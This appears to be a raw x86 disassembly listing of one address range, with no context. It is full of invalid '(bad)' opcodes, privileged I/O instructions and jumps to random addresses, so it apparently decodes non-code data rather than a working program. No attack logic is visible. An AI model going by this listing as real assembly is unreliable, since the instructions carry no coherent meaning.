  414a04:	cwde   
  414a05:	loop   0x414a75
  414a07:	out    dx,eax
  414a08:	bound  eax,QWORD PTR [eax]
  414a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a0c:	mov    ds:0xb7769e67,al
  414a11:	fisttp QWORD PTR [ebx-0x5c8d89c3]
  414a17:	fs dec edi
  414a19:	xlat   BYTE PTR ds:[ebx]
  414a1a:	mov    esi,0xc9ec7358
  414a1f:	pushf  
  414a20:	push   esp
  414a21:	xor    bl,BYTE PTR [edi+0xa]
  414a24:	pop    edx
  414a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a26:	add    BYTE PTR [edi+0x70],cl
  414a29:	dec    ebx
  414a2a:	mov    ds:0x676a2043,eax
  414a2f:	aam    0x86
  414a31:	sub    eax,0xa8c6fe80
  414a36:	mov    dl,0x54
  414a38:	loopne 0x414a28
  414a3a:	jmp    0x4149d3
  414a3c:	ret    0xc44a
  414a3f:	adc    bl,BYTE PTR [eax+0x26]
  414a42:	jl     0x414a0c
  414a44:	mov    esp,0x6e921888
  414a49:	inc    esp
  414a4a:	jns    0x414a71
  414a4c:	call   0x8bd07d0b
  414a51:	enter  0xa4c0,0x48
  414a55:	outs   dx,BYTE PTR ds:[esi]
  414a56:	inc    edx
  414a57:	lds    esp,FWORD PTR [ebx]
  414a59:	ins    DWORD PTR es:[edi],dx
  414a5a:	lock jmp 0x414ad5
  414a5d:	mov    ?,esp
  414a5f:	test   eax,0xba1f3e4a
  414a64:	push   0x2097ce8c
  414a69:	inc    edi
  414a6a:	xchg   BYTE PTR [edi],bl
  414a6c:	ficom  DWORD PTR [esi+0x3ae34281]
  414a72:	enter  0x8466,0x87
  414a76:	mov    al,0x48
  414a78:	jle    0x4149fc
  414a7a:	sub    eax,0xfdb1a884
  414a7f:	sub    dl,BYTE PTR [eax-0x6d]
  414a82:	into   
  414a83:	fisttp WORD PTR [eax+ecx*8-0x93b49ec]
  414a8a:	fdivr  DWORD PTR [ecx+0x79]
  414a8d:	push   cs
  414a8e:	(bad)  
  414a8f:	jmp    0x414a4b
  414a91:	(bad)  
  414a92:	fst    DWORD PTR [esi+0x49]
  414a95:	pop    ebx
  414a96:	stc    
  414a97:	ret    0x3c58
  414a9a:	xchg   ebp,eax
  414a9b:	cmp    DWORD PTR [eax-0x25],esp
  414a9e:	pop    eax
  414a9f:	add    eax,DWORD PTR [edx-0x24dcc2c5]
  414aa5:	mov    bl,0xae
  414aa7:	sti    
  414aa8:	outs   dx,BYTE PTR ds:[esi]
  414aa9:	scas   eax,DWORD PTR es:[edi]
  414aaa:	clc    
  414aab:	xor    DWORD PTR [edx-0x64],edi
  414aae:	fdiv   QWORD PTR [edx]
  414ab0:	or     BYTE PTR [edi],bl
  414ab2:	pop    es
  414ab3:	ja     0x414a37
  414ab5:	shr    DWORD PTR [edx+0x5d],cl
  414ab8:	sahf   
  414ab9:	in     eax,0xbb
  414abb:	(bad)  
  414abc:	pusha  
  414abd:	cmp    al,0xd0
  414abf:	pop    edi
  414ac0:	inc    ecx
  414ac1:	sti    
  414ac2:	jb     0x414a55
  414ac4:	enter  0xa2b8,0xc5
  414ac8:	mov    bl,0x67
  414aca:	push   cs
  414acb:	in     al,0x99
  414acd:	push   edi
  414ace:	xor    BYTE PTR [edi],0xca
  414ad1:	cmp    BYTE PTR [ebp-0x20c7e873],ah
  414ad7:	test   DWORD PTR [ecx+0x38e7f557],esi
  414add:	jmp    0x414a73
  414adf:	imul   ebx,DWORD PTR [edi+0x67],0xc5753c39
  414ae6:	lss    edi,FWORD PTR [ebp+ebp*8-0x10]
  414aeb:	fnsave [ebx]
  414aed:	ror    BYTE PTR [edx-0x30344743],cl
  414af3:	dec    eax
  414af4:	repnz scas al,BYTE PTR es:[edi]
  414af6:	mov    eax,0x31b05ae0
  414afb:	inc    ecx
  414afc:	add    al,0x8c
  414afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aff:	add    al,0x53
  414b01:	push   ebx
  414b02:	out    0x35,eax
  414b04:	std    
  414b05:	pop    edi
  414b06:	push   esi
  414b07:	sbb    DWORD PTR [edx],edx
  414b09:	xchg   ebx,eax
  414b0a:	xchg   edi,eax
  414b0b:	stos   DWORD PTR es:[edi],eax
  414b0c:	pushf  
  414b0d:	jecxz  0x414a93
  414b0f:	jecxz  0x414ac0
  414b11:	les    ecx,FWORD PTR [ecx-0x80]
  414b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b15:	jno    0x414b83
  414b17:	lahf   
  414b18:	jge    0x414ae3
  414b1a:	xor    esp,DWORD PTR [esi+0x4e198690]
  414b20:	getsec 
  414b22:	sub    ch,BYTE PTR [esi]
  414b24:	sub    dh,bl
  414b26:	dec    edi
  414b27:	or     bh,dl
  414b29:	cmp    eax,0xb6ac7e7c
  414b2e:	(bad)  
  414b2f:	data16 xor ah,BYTE PTR [eax-0x6a]
  414b33:	push   eax
  414b34:	loop   0x414aca
  414b36:	or     eax,0x405c74c6
  414b3b:	pop    esi
  414b3c:	(bad)  [ecx-0x38]
  414b3f:	mov    WORD PTR [ebx],es
  414b41:	int    0xfc
  414b43:	add    BYTE PTR [ebx],ch
  414b45:	sub    DWORD PTR [ebp+0x77],eax
  414b48:	xchg   edx,eax
  414b49:	cld    
  414b4a:	cli    
  414b4b:	sar    BYTE PTR [edx],0xc5
  414b4e:	mov    ss,WORD PTR [ebx+0x78]
  414b51:	xchg   esp,eax
  414b52:	rcr    BYTE PTR [edx-0x4f],cl
  414b55:	cli    
  414b56:	(bad)  
  414b57:	or     bl,BYTE PTR [edi-0x605a9933]
  414b5d:	and    bh,BYTE PTR [edi]
  414b5f:	out    dx,eax
  414b60:	push   ss
  414b61:	adc    al,BYTE PTR gs:[eax+0x31d5fc5]
  414b68:	jb     0x414b48
  414b6a:	imul   ebp,DWORD PTR [esi+0x2f4a4935],0x17
  414b71:	ja     0x414b19
  414b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b74:	fcmovbe st,st(7)
  414b76:	adc    al,0xe7
  414b78:	ret    
  414b79:	xchg   ah,cl
  414b7b:	test   al,0x74
  414b7d:	push   eax
  414b7e:	cmp    eax,ebp
  414b80:	sub    cl,BYTE PTR [esi]
  414b82:	inc    eax
  414b83:	fadd   DWORD PTR [edx]
  414b85:	sbb    esi,DWORD PTR [edi-0x1822f6c7]
  414b8b:	sar    DWORD PTR [edx-0x49],cl
  414b8e:	sub    esp,DWORD PTR [ecx]
  414b90:	xor    BYTE PTR [edx+ebp*8-0x22517e8e],0x7b
  414b98:	jecxz  0x414b2f
  414b9a:	pop    edi
  414b9b:	or     dl,BYTE PTR [ecx+0x67c87a3e]
  414ba1:	cs pop es
  414ba3:	push   ecx
  414ba4:	rol    DWORD PTR [ecx-0x528dc11b],1
  414baa:	imul   esi,ebp,0x49
  414bad:	fmul   DWORD PTR [esp+ecx*1+0x1f0caa38]
  414bb4:	adc    eax,0x256e56ca
  414bb9:	xor    DWORD PTR [eax],esi
  414bbb:	popf   
  414bbc:	dec    edx
  414bbd:	(bad)  
  414bbe:	push   edx
  414bbf:	lea    edi,[ebp+0x1d]
  414bc2:	jmp    0x9294a7d4
  414bc7:	lock xchg edi,eax
  414bc9:	es out 0xcb,al
  414bcc:	std    
  414bcd:	test   eax,0x857ad468
  414bd2:	inc    edx
  414bd3:	adc    al,0x4e
  414bd5:	cdq    
  414bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bd7:	sub    eax,0x6ca156c0
  414bdc:	cmc    
  414bdd:	fnstenv [edi-0x5f57a26]
  414be3:	cwde   
  414be4:	cmp    ah,BYTE PTR [ebp+0x36a2ca5b]
  414bea:	imul   dh
  414bec:	loop   0x414c40
  414bee:	call   0xc9284eb4
  414bf3:	and    DWORD PTR [ecx],ecx
  414bf5:	jmp    0x414c56
  414bf7:	rol    BYTE PTR [eax+0x685765c4],1
  414bfd:	xor    bh,al
  414bff:	xchg   esi,edi
  414c01:	scas   eax,DWORD PTR es:[edi]
  414c02:	out    0x65,al
  414c04:	jns    0x414bdf
  414c06:	add    edx,DWORD PTR [ebx-0x196c3754]
  414c0c:	jge    0x414b91
  414c0e:	mov    ebx,0x58b78838
  414c13:	xchg   eax,ecx
  414c15:	js     0x414bcb
  414c17:	shr    esp,cl
  414c19:	cld    
  414c1a:	jl     0x414c84
  414c1c:	aaa    
  414c1d:	add    eax,0xb88bfebb
  414c22:	(bad)  
  414c24:	xchg   edi,eax
  414c25:	dec    eax
  414c26:	push   ebp
  414c27:	mov    cs,WORD PTR [esi-0x3d069e37]
  414c2d:	jae    0x414c26
  414c2f:	lods   eax,DWORD PTR ds:[esi]
  414c30:	ror    dh,0x55
  414c33:	aam    0x3
  414c35:	(bad)  
  414c36:	dec    eax
  414c37:	push   esi
  414c38:	jo     0x414c48
  414c3a:	or     bh,BYTE PTR [edx]
  414c3c:	(bad)  
  414c3d:	and    al,bl
  414c3f:	lock scas eax,DWORD PTR es:[edi]
  414c41:	mov    bl,0x10
  414c43:	sar    cl,cl
  414c45:	mov    bl,0x6d
  414c47:	sub    dh,bl
  414c49:	(bad)  
  414c4a:	imul   esp,DWORD PTR [esi+ecx*4],0xf
  414c4e:	fwait
  414c4f:	mov    ecx,0xd1085ae4
  414c54:	fsubrp st(5),st
  414c56:	fist   WORD PTR [eax-0x644246af]
  414c5c:	int3   
  414c5d:	pushf  
  414c5e:	adc    eax,0x3de7fa4f
  414c63:	pop    esp
  414c64:	push   ecx
  414c65:	aaa    
  414c66:	inc    edx
  414c67:	js     0x414cbc
  414c69:	jnp    0x414cd1
  414c6b:	pusha  
  414c6c:	aas    
  414c6d:	mov    BYTE PTR [esi],bl
  414c6f:	repnz fst DWORD PTR [edi+0x57]
  414c73:	les    edx,FWORD PTR [ecx]
  414c75:	jmp    0x414c73
  414c77:	mov    dl,0xa
  414c79:	(bad)  
  414c7a:	int3   
  414c7b:	xchg   DWORD PTR [eax-0x28],ebp
  414c7e:	dec    esi
  414c7f:	sbb    ebp,eax
  414c81:	bound  esp,QWORD PTR [ebx+0x30]
  414c84:	pop    edi
  414c85:	shl    BYTE PTR [ecx+eax*8-0x264f7029],1
  414c8c:	dec    bh
  414c8e:	dec    edx
  414c8f:	push   esp
  414c90:	rol    DWORD PTR [esi],1
  414c92:	arpl   bx,bx
  414c94:	push   esi
  414c95:	mov    ebp,DWORD PTR [ecx+0x6abd2830]
  414c9b:	or     cl,BYTE PTR [ebp-0x4]
  414c9e:	mov    ch,0x0
  414ca0:	add    eax,0xfbe54068
  414ca5:	fsubrp st(1),st
  414ca7:	inc    esp
  414ca8:	push   ebp
  414ca9:	or     eax,esp
  414cab:	mov    edi,edx
  414cad:	add    eax,0x20db7d33
  414cb2:	add    eax,0xb9933916
  414cb7:	sti    
  414cb8:	push   ebx
  414cb9:	or     BYTE PTR [ecx],cl
  414cbb:	pop    es
  414cbc:	push   esi
  414cbd:	int    0xf5
  414cbf:	pushf  
  414cc0:	jmp    0x414d16
  414cc2:	add    ah,BYTE PTR [ebx+ebx*8+0x1f]
  414cc6:	cli    
  414cc7:	mov    DWORD PTR [ebp+0x3131915b],edx
  414ccd:	in     eax,dx
  414cce:	xchg   ebx,eax
  414ccf:	rcr    BYTE PTR [eax+ebx*8+0x3be1c888],cl
  414cd6:	lods   eax,DWORD PTR ds:[esi]
  414cd7:	jg     0x414d24
  414cd9:	mov    DWORD PTR [esi+0x76f6ea1],ebx
  414cdf:	jmp    FWORD PTR [ebx-0xbe480db]
  414ce5:	cmc    
  414ce6:	push   edi
  414ce7:	mov    edi,0x10811f22
  414cec:	mov    al,0xac
  414cee:	lahf   
  414cef:	push   0xa5951023
  414cf4:	mov    bh,0xbb
  414cf6:	inc    ebx
  414cf7:	and    ebp,DWORD PTR [ecx]
  414cf9:	sti    
  414cfa:	inc    eax
  414cfb:	sub    BYTE PTR [ecx-0x18],dh
  414cfe:	push   eax
  414cff:	mov    dl,0xd7
  414d01:	imul   edx,DWORD PTR [edx+0xf],0x2134072b
  414d08:	aam    0xcb
  414d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d0b:	cmc    
  414d0c:	scas   al,BYTE PTR es:[edi]
  414d0d:	pusha  
  414d0e:	cmp    al,0x6e
  414d10:	push   ebp
  414d11:	sahf   
  414d12:	mov    dl,0x4b
  414d14:	xor    al,0xe5
  414d16:	adc    ecx,edx
  414d18:	sbb    al,0xcd
  414d1a:	dec    edx
  414d1b:	pusha  
  414d1c:	outs   dx,DWORD PTR cs:[esi]
  414d1e:	xor    DWORD PTR [ebp+0x650f1460],ecx
  414d24:	nop
  414d25:	mov    dl,0xf6
  414d27:	(bad)  [edx]
  414d29:	cli    
  414d2a:	add    ch,dh
  414d2c:	pop    esi
  414d2d:	icebp  
  414d2e:	or     DWORD PTR [eax],ebp
  414d30:	add    cx,WORD PTR [bx+si]
  414d34:	fild   DWORD PTR [edi+edi*2-0x29fc9b9a]
  414d3b:	cdq    
  414d3c:	je     0x414d2d
  414d3e:	or     ch,dh
  414d40:	push   edx
  414d41:	fnstsw WORD PTR [edx+0x63]
  414d44:	sbb    ah,cl
  414d46:	lds    esp,FWORD PTR [ebx+0x23]
  414d49:	ja     0x414d86
  414d4b:	jg     0x414d1c
  414d4d:	scas   eax,DWORD PTR es:[edi]
  414d4e:	test   DWORD PTR [esi-0x69],edx
  414d51:	inc    ebp
  414d52:	cli    
  414d53:	adc    BYTE PTR [ebx+eax*4+0x4efc2d4a],bl
  414d5a:	aam    0xd1
  414d5c:	cmp    edx,esi
  414d5e:	cwde   
  414d5f:	in     al,0xed
  414d61:	cmc    
  414d62:	hlt    
  414d63:	sub    dh,BYTE PTR [ebp+0x23]
  414d66:	push   es
  414d67:	(bad)  [esi+0x7d]
  414d6a:	(bad)  
  414d6b:	cmp    al,0x34
  414d6d:	fdiv   DWORD PTR [edx-0x37]
  414d70:	jl     0x414d52
  414d72:	xor    al,0xb
  414d74:	fs test ah,dh
  414d77:	push   cs
  414d78:	dec    eax
  414d79:	sti    
  414d7a:	mov    ds:0x9d3aa058,eax
  414d7f:	inc    edi
  414d80:	pop    edi
  414d81:	imul   ebp,DWORD PTR [ebp+0x14],0x5e
  414d85:	mov    dl,ch
  414d87:	mov    gs,ebx
  414d89:	push   ds
  414d8a:	(bad)  
  414d8b:	mov    ecx,0xc6d8b8f5
  414d90:	cdq    
  414d91:	or     eax,0x25730e78
  414d96:	fisub  DWORD PTR [edx]
  414d98:	pop    eax
  414d99:	jmp    0x414e03
  414d9b:	scas   eax,DWORD PTR es:[edi]
  414d9c:	add    BYTE PTR [esi+0x4c],dh
  414d9f:	or     eax,0xfdea68e6
  414da4:	push   0xffffffb2
  414da6:	dec    edx
  414da7:	lock stos DWORD PTR es:[edi],eax
  414da9:	test   BYTE PTR [ebp-0x4e],cl
  414dac:	out    dx,eax
  414dad:	mov    edx,0xc77a7e62
  414db2:	sbb    ebp,DWORD PTR [esi+0x4398709c]
  414db8:	out    dx,al
  414db9:	push   esi
  414dba:	cmp    dh,BYTE PTR [esi+eiz*2-0x53753ee8]
  414dc1:	mov    BYTE PTR [ecx],ah
  414dc3:	out    dx,eax
  414dc4:	inc    esp
  414dc5:	push   ds
  414dc6:	imul   edx,DWORD PTR [eax+edi*4-0x7b],0x7452ed59
  414dce:	imul   ecx,DWORD PTR [ecx],0xffffff92
  414dd1:	shr    DWORD PTR [esi],0x7b
  414dd4:	test   BYTE PTR [ecx-0x5cc073f],ah
  414dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ddb:	adc    esi,DWORD PTR [ebx+eax*2]
  414dde:	mov    ch,0x88
  414de0:	jp     0x414d63
  414de2:	cmp    edx,eax
  414de4:	xchg   edx,eax
  414de5:	imul   bh
  414de7:	cmp    DWORD PTR [ebx+0x7e1db6f5],esp
  414ded:	cmp    al,0xe9
  414def:	retf   
  414df0:	inc    esp
  414df1:	push   edx
  414df2:	cmp    esp,eax
  414df4:	repnz sahf 
  414df6:	pop    ebp
  414df7:	ror    DWORD PTR [ecx+0x6e],1
  414dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dfb:	or     esi,DWORD PTR [ebp+0x5]
  414dfe:	lods   eax,DWORD PTR ds:[esi]
  414dff:	test   eax,0xe414b538
  414e04:	mov    edi,0xbf19450a
  414e09:	ins    BYTE PTR es:[edi],dx
  414e0a:	sti    
  414e0b:	push   eax
  414e0c:	mul    cl
  414e0e:	test   eax,0x4df62009
  414e13:	dec    ebx
  414e14:	popf   
  414e15:	pop    ebx
  414e16:	jns    0x414e2d
  414e18:	enter  0xcc34,0xd6
  414e1c:	mov    ds:0xff5a5ce2,al
  414e21:	out    0xb7,eax
  414e23:	adc    al,BYTE PTR [ecx+ecx*1+0x43]
  414e27:	adc    esi,DWORD PTR [ebx+0x77304eef]
  414e2d:	in     al,dx
  414e2e:	lods   al,BYTE PTR ds:[esi]
  414e2f:	mov    dh,0x14
  414e31:	mov    BYTE PTR [edx],bh
  414e33:	repnz xor dh,dh
  414e36:	pop    esp
  414e37:	or     al,BYTE PTR ds:0x71c4e1b7
  414e3d:	push   ds
  414e3e:	add    al,0x11
  414e40:	mov    ebx,0x2daa2334
  414e45:	and    DWORD PTR [esi-0x75],ebx
  414e48:	aad    0x40
  414e4a:	push   cs
  414e4b:	pop    ds
  414e4c:	mov    BYTE PTR [edi+ebx*8+0x68],bl
  414e50:	xor    dl,cl
  414e52:	lds    di,DWORD PTR [ebx+0x7b]
  414e56:	pop    ebx
  414e57:	arpl   WORD PTR [ecx+eiz*2],cx
  414e5a:	enter  0x7a39,0xef
  414e5e:	rcl    DWORD PTR [edi+edi*1+0x48],1
  414e62:	gs inc ebp
  414e64:	inc    ebp
  414e65:	bound  eax,QWORD PTR [ebx]
  414e67:	mov    esp,0x5dee52b8
  414e6c:	dec    eax
  414e6d:	imul   ecx,ebp,0xffffffbc
  414e70:	add    cl,BYTE PTR [edi-0x4f599c55]
  414e76:	rol    eax,1
  414e78:	cli    
  414e79:	not    BYTE PTR [edi-0x5bd10e67]
  414e7f:	sbb    BYTE PTR [edx-0x3c],ch
  414e82:	and    ah,BYTE PTR [edx+0x71859f6a]
  414e88:	leave  
  414e89:	jmp    0x61d3:0x490c9f27
  414e90:	dec    edx
  414e91:	ret    
  414e92:	push   ecx
  414e93:	dec    edi
  414e94:	xchg   ebx,eax
  414e95:	xor    eax,0xe051b05b
  414e9a:	aam    0x60
  414e9c:	xor    edx,DWORD PTR [esi+0x394b9559]
  414ea2:	xchg   esp,eax
  414ea3:	in     al,dx
  414ea4:	ds mov esp,0x9bc9398b
  414eaa:	dec    ebp
  414eab:	xor    BYTE PTR [ebp-0x6b530640],cl
  414eb1:	call   0xd3d4:0xed9dc5d1
  414eb8:	mov    al,0x83
  414eba:	push   esp
  414ebb:	das    
  414ebc:	mov    esi,0xfe4f922c
  414ec1:	cmp    eax,0x525fef91
  414ec6:	adc    BYTE PTR [ebx-0x3df8c33],al
  414ecc:	jmp    0xb7d2b93c
  414ed1:	pop    ds
  414ed2:	icebp  
  414ed3:	xor    DWORD PTR [edx+0xa],esi
  414ed6:	jle    0x414ebe
  414ed8:	bound  edi,QWORD PTR [ecx+edx*4+0x27]
  414edc:	sbb    eax,0x95a18abf
  414ee1:	mov    ebx,0xd4eef938
  414ee6:	pop    eax
  414ee7:	and    eax,0x5c2f37db
  414eec:	mov    ch,0x55
  414eee:	mov    edx,0xb4bd5f9e
  414ef3:	ins    DWORD PTR es:[edi],dx
  414ef4:	mov    DWORD PTR [edi-0x288595b9],ecx
  414efa:	into   
  414efb:	fcomp  QWORD PTR [eax+0x67]
  414efe:	mov    cl,0xb5
  414f00:	repnz or eax,0xad20a4cd
  414f06:	mov    ebp,0x1a2a8d36
  414f0b:	cld    
  414f0c:	shl    BYTE PTR [esi+0x27],1
  414f0f:	fsub   st(1),st
  414f11:	jae    0x414f82
  414f13:	mov    edx,0xeafdd6bf
  414f18:	cmp    eax,0x6bc9651c
  414f1d:	sar    DWORD PTR [ebx+0x11],cl
  414f20:	or     DWORD PTR [edx-0x29],esi
  414f23:	cmp    bl,BYTE PTR [ebx-0x27c188e4]
  414f29:	ss push ds
  414f2b:	js     0x414f31
  414f2d:	or     al,0xd7
  414f2f:	sbb    eax,edx
  414f31:	xchg   BYTE PTR [esi-0x44],al
  414f34:	enter  0x296d,0x91
  414f38:	jne    0x414ed0
  414f3a:	sbb    cl,BYTE PTR [esi+0x6e068c72]
  414f40:	mov    edi,0xf6d9d483
  414f45:	fwait
  414f46:	cwde   
  414f47:	popa   
  414f48:	sbb    ch,0xa2
  414f4b:	pop    esi
  414f4c:	cmp    BYTE PTR [esp+edx*2+0xe04fb55],0xa1
  414f54:	dec    ebp
  414f55:	jecxz  0x414fc0
  414f57:	cmp    esi,DWORD PTR [edi]
  414f59:	int    0xb5
  414f5b:	test   DWORD PTR [ebx-0x39],esp
  414f5e:	(bad)  
  414f5f:	bound  ebp,QWORD PTR [ebp+ecx*8+0x20]
  414f63:	sahf   
  414f64:	ror    dx,1
  414f67:	bound  ecx,QWORD PTR cs:[ecx-0x37]
  414f6b:	xchg   BYTE PTR [edi-0x11976447],cl
  414f71:	cdq    
  414f72:	shl    DWORD PTR [edx-0x11],cl
  414f75:	retf   
  414f76:	dec    ecx
  414f77:	sbb    BYTE PTR [eax-0x6e],bh
  414f7a:	sahf   
  414f7b:	repz add edx,DWORD PTR [esi]
  414f7e:	lock mov al,ds:0x9e5c6433
  414f84:	cmp    al,BYTE PTR [edi]
  414f86:	push   edi
  414f87:	hlt    
  414f88:	das    
  414f89:	and    ch,bl
  414f8b:	jo     0x414f98
  414f8d:	(bad)  
  414f8e:	dec    ebx
  414f8f:	xor    esi,DWORD PTR [edi+esi*8]
  414f92:	pushf  
  414f93:	sbb    ebp,eax
  414f95:	mov    esp,0x71ce367d
  414f9a:	dec    edx
  414f9b:	es cmp ah,ch
  414f9e:	loopne 0x414fee
  414fa0:	xorps  xmm1,XMMWORD PTR [edi]
  414fa3:	inc    ecx
  414fa4:	xor    al,0xbb
  414fa6:	shr    BYTE PTR [ecx+0x6448b10f],cl
  414fac:	dec    esi
  414fad:	push   esi
  414fae:	adc    cl,BYTE PTR [edx-0x46149fa4]
  414fb4:	mov    bh,0x3a
  414fb6:	xchg   BYTE PTR [ebx],dl
  414fb8:	pop    es
  414fb9:	push   es
  414fba:	push   cs
  414fbb:	inc    ebx
  414fbc:	push   ecx
  414fbd:	or     dl,BYTE PTR [edx+0x14]
  414fc0:	gs aam 0x62
  414fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc4:	mov    ecx,0xa4776cfd
  414fc9:	loopne 0x414f6f
  414fcb:	push   0xeb6d6956
  414fd0:	ret    
  414fd1:	and    DWORD PTR [ecx+ebp*1],esi
  414fd4:	(bad)  
  414fd6:	or     esp,ecx
  414fd8:	xchg   esi,eax
  414fd9:	push   ss
  414fda:	test   DWORD PTR [eax-0x23],ebp
  414fdd:	push   0x25
  414fdf:	dec    ecx
  414fe0:	popf   
  414fe1:	idiv   DWORD PTR [ecx-0x32]
  414fe4:	fs adc eax,0x84c37f89
  414fea:	in     eax,dx
  414feb:	dec    ebp
  414fec:	ins    BYTE PTR es:[edi],dx
  414fed:	loopne 0x415024
  414fef:	inc    edx
  414ff0:	push   edi
  414ff1:	or     ecx,DWORD PTR [ecx-0x76c532a]
  414ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ff8:	dec    edx
  414ff9:	jb     0x414fe0
  414ffb:	xor    dl,dh
  414ffd:	pop    esp
  414ffe:	inc    edx
  414fff:	mov    WORD PTR [ebp+0x1e97d61e],gs
  415005:	add    BYTE PTR [ecx],dl
  415007:	mov    al,ds:0x36ca3f9c
  41500c:	or     al,0x28
  41500e:	(bad)  
  415010:	bound  esp,QWORD PTR [ebp-0x77]
  415013:	sbb    DWORD PTR [ecx+0x61],0xe
  415017:	(bad)  
  415018:	out    dx,al
  415019:	mov    dl,0x61
  41501b:	in     al,dx
  41501c:	xchg   esp,eax
  41501d:	cli    
  41501e:	dec    ebp
  41501f:	push   ecx
  415020:	jbe    0x414fc4
  415022:	pop    esp
  415023:	jnp    0x415068
  415025:	mov    eax,edx
  415027:	sub    ah,ch
  415029:	loop   0x414fcc
  41502b:	pop    esi
  41502c:	aas    
  41502d:	fimul  DWORD PTR [ecx]
  41502f:	adc    eax,0xd97abe1b
  415034:	inc    ebp
  415035:	sti    
  415036:	test   BYTE PTR [esi+0x7e],0xf3
  41503a:	jnp    0x41503d
  41503c:	cdq    
  41503d:	mov    WORD PTR [ecx],ss
  41503f:	xchg   DWORD PTR [edi-0x76b5d64f],ecx
  415045:	fwait
  415046:	adc    al,BYTE PTR [esi-0x5a]
  415049:	xor    bh,bl
  41504b:	(bad)  
  41504c:	fwait
  41504d:	pop    ss
  41504e:	popf   
  41504f:	push   ecx
  415050:	dec    edi
  415051:	fadd   DWORD PTR [esi+0x21]
  415054:	sbb    eax,DWORD PTR [edi+0x2f]
  415057:	push   ebx
  415058:	in     al,0x65
  41505a:	in     al,dx
  41505b:	jb     0x414fe1
  41505d:	inc    ecx
  41505e:	mov    BYTE PTR [ebx+0x7d],bl
  415061:	stc    
  415062:	lea    eax,[edx+esi*2]
  415065:	ret    0xcda7
  415068:	mov    esi,0x35b33833
  41506d:	out    dx,al
  41506e:	jge    0x415022
  415070:	je     0x41504a
  415072:	pusha  
  415073:	mov    dl,0xaf
  415075:	sbb    eax,0x1f30c37a
  41507a:	ffreep st(1)
  41507c:	sbb    edx,DWORD PTR cs:[edx]
  41507f:	gs js  0x4150f6
  415082:	iret   
  415083:	(bad)  
  415084:	and    eax,0x2d78d11f
  415089:	fcomp  st(2)
  41508b:	shl    DWORD PTR [eax-0x4384c071],cl
  415091:	dec    ecx
  415092:	sub    BYTE PTR [eax+0x4f],ch
  415095:	jns    0x415108
  415097:	loopne 0x41501b
  415099:	in     al,0xa9
  41509b:	sub    ecx,DWORD PTR [ecx+0x3f]
  41509e:	(bad)  
  41509f:	repz mov ebx,0x9894120e
  4150a5:	xchg   ecx,eax
  4150a6:	or     al,0x74
  4150a8:	or     cl,BYTE PTR [esi+0x14]
  4150ab:	adc    BYTE PTR [ebx+0x5b4f19ce],cl
  4150b1:	mov    ch,0x1f
  4150b3:	jb     0x415091
  4150b5:	mov    bh,0x4a
  4150b7:	jecxz  0x4150dc
  4150b9:	adc    eax,DWORD PTR [ecx]
  4150bb:	fmul   DWORD PTR [esi-0x28]
  4150be:	lds    edx,FWORD PTR [esi-0x27]
  4150c1:	fidivr DWORD PTR [edx+ecx*2+0x1e]
  4150c5:	iret   
  4150c6:	pop    ebx
  4150c7:	dec    ebx
  4150c8:	jmp    0x2d985f54
  4150cd:	mov    edi,0xd561da4f
  4150d2:	inc    esi
  4150d3:	lock pop es
  4150d5:	inc    ebx
  4150d6:	xchg   cl,bl
  4150d8:	fiadd  WORD PTR [esi+0x124aa6c8]
  4150de:	hlt    
  4150df:	mov    esi,0xa77f4e09
  4150e4:	por    mm3,QWORD PTR [ecx]
  4150e7:	adc    bh,BYTE PTR [ebp+0x12]
  4150ea:	out    0xca,al
  4150ec:	jecxz  0x4150f9
  4150ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150ef:	fs pop esi
  4150f1:	fild   DWORD PTR [ebx]
  4150f3:	mov    BYTE PTR [edx+0x508fd639],al
  4150f9:	mov    esp,0x8be12f76
  4150fe:	cmp    BYTE PTR [edi+0x2a5723f3],bl
  415104:	fisttp WORD PTR [edx+edx*1-0x37842663]
  41510b:	add    dl,BYTE PTR [ecx-0x28ec13e0]
  415111:	inc    ebp
  415112:	in     eax,dx
  415113:	retf   
  415114:	arpl   WORD PTR [edx],si
  415116:	jae    0x4150da
  415118:	addr16 retf 0xaddc
  41511c:	pop    ecx
  41511d:	gs lock scas eax,DWORD PTR es:[edi]
  415120:	(bad)  
  415121:	or     eax,0x2695e8c4
  415126:	std    
  415127:	dec    ecx
  415128:	das    
  415129:	repnz fst st(5)
  41512c:	out    dx,eax
  41512d:	mov    ebx,0x8c74d47a
  415132:	imul   eax,eax,0xffffffec
  415135:	mov    dh,bl
  415137:	sar    BYTE PTR [ebp-0x387b0618],0xc
  41513e:	loopne 0x4150da
  415140:	jmp    0x37c2:0xe6ab3b89
  415147:	enter  0xbb4c,0x32
  41514b:	arpl   WORD PTR ds:0xb38d2fdc,si
  415151:	out    dx,eax
  415152:	fcomp  DWORD PTR [edi+ecx*2-0x60]
  415156:	inc    esp
  415157:	call   0xfeae:0x3861ba3
  41515e:	clc    
  41515f:	adc    BYTE PTR [eax-0xccf8027],0x6e
  415166:	dec    ecx
  415167:	loop   0x4150f8
  415169:	mov    ss,WORD PTR [ebx+ecx*2]
  41516c:	fucomip st,st(3)
  41516e:	inc    edi
  41516f:	mov    eax,0x43477f15
  415174:	xlat   BYTE PTR ds:[ebx]
  415175:	sub    al,0xbb
  415177:	jns    0x41517d
  415179:	inc    ebx
  41517a:	push   esi
  41517b:	das    
  41517c:	push   0x34
  41517e:	(bad)  
  41517f:	hlt    
  415180:	je     0x41513f
  415182:	pop    DWORD PTR [ebp-0x52557ae8]
  415188:	inc    ecx
  415189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41518a:	inc    eax
  41518b:	(bad)  
  41518c:	outs   dx,DWORD PTR ds:[esi]
  41518d:	xchg   ebp,eax
  41518e:	pop    edi
  41518f:	mov    DWORD PTR [eax+0x7e],edx
  415192:	aaa    
